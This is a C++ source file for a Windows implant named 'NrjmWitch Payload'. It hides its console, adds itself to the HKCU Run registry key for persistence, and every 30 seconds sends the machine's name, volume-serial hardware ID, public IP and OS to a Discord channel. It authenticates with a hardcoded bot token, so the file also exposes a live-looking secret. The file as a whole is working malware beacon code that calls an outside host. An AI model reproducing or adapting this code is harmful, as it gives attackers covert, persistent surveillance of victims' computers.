#define USE_PERSISTENCE
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

const std::string LICENSE_KEY = "1a570baf26015ed1e39c1036cc71b8f3";
const std::string BOT_TOKEN = "MTQ3MTU0MDY0NDA3MjkxOTE4Mg.G09i_c.Fn8VXUaIC9_a-Lqs2hxl11orZt-NsBdttd0VhA";
const std::string CHANNEL_ID = "1471566542302089226";

std::string GetComputerName() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown";
}

std::string GetHardwareID() {
    char volumeName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    if (GetVolumeInformationA("C:\\", volumeName, sizeof(volumeName), &serialNumber, NULL, NULL, NULL, 0)) {
        std::stringstream ss;
        ss << std::hex << serialNumber;
        return ss.str();
    }
    return "Unknown";
}

std::string GetPublicIP() {
    HINTERNET hNet = InternetOpenA("NrjmWitchClient", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return "127.0.0.1";

    HINTERNET hFile = InternetOpenUrlA(hNet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hNet);
        return "127.0.0.1";
    }

    char buffer[1024];
    DWORD bytesRead;
    std::string ip;
    while (InternetReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        ip += buffer;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hNet);
    
    // Simple validation (check if valid IP format roughly)
    if (ip.length() < 7 || ip.length() > 15) return "127.0.0.1";
    return ip;
}

std::string GetOSVersion() {
    return "Windows";
}

bool SendCheckin() {
    std::string hwid = GetHardwareID();
    std::string ip = GetPublicIP();
    std::string pcName = GetComputerName();
    std::string os = GetOSVersion();
    
    std::string message = "!checkin " + LICENSE_KEY + " " + hwid + " " + ip + " " + pcName + " " + os;
    std::string jsonPayload = "{\"content\":\"" + message + "\"}";
    
    // User-Agent changed to Chrome and Type to PRECONFIG for Proxy Support
    HINTERNET hSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 0, NULL, NULL, 0); 
    if (!hSession) return false;

    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return false;
    }

    std::string path = "/api/v10/channels/" + CHANNEL_ID + "/messages";
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    
    if (hRequest) {
        std::string headers = "Authorization: Bot " + BOT_TOKEN + "\r\nContent-Type: application/json";
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return true;
}

void InstallPersistence() {
    std::cout << "[INFO] Installing Persistence..." << std::endl;
    HKEY hKey;
    const char* czKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, czKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        if (RegSetValueExA(hKey, "NrjmWitchClient", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            std::cout << "[SUCCESS] Persistence Installed!" << std::endl;
        } else {
            std::cout << "[ERROR] Failed to set registry value." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cout << "[ERROR] Failed to open registry key." << std::endl;
    }
}

int main() {
    // Enable Console logic based on defines or debug mode
    #ifdef _DEBUG
    // Console is enabled by default when not using -mwindows
    #else
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
    
    std::cout << "============================================" << std::endl;
    std::cout << "   NrjmWitch Payload Debug Mode v1.0.4" << std::endl;
    std::cout << "============================================" << std::endl;

    #ifdef USE_PERSISTENCE
    InstallPersistence();
    #endif
    
    std::cout << "[INFO] Initializing Check-in Loop..." << std::endl;
    bool success = SendCheckin();
    if (success) {
        std::cout << "[SUCCESS] First Check-in Sent!" << std::endl;
    } else {
        std::cout << "[ERROR] First Check-in Failed! Check internet connection." << std::endl;
    }
    
    while (true) {
        std::cout << "[INFO] Sleeping for 30 seconds..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(30));
        std::cout << "[INFO] Sending Check-in..." << std::endl;
        SendCheckin();
    }
    
    return 0;
}